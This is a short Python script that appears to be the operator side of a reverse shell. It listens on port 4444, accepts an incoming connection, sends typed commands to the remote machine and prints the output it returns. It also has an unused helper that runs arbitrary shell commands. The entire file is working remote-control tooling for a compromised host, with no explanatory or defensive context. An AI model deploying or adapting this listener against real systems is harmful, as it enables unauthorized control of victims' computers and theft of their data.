#!/usr/bin/env python
import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("\n[+] Waiting for incoming connection.\n")
        self.connection, address = listener.accept()
        print("\n[+] Connection accepted\n" + str(address))

    def execute_remotely(self, command):
        self.connection.send(command.encode())
        return self.connection.recv(1024)


    def run(self):
        while True:
            command = input(">>")
            result = self.execute_remotely(command)
            print(result.decode())




my_listener = Listener("127.0.0.1",4444)
my_listener.run()
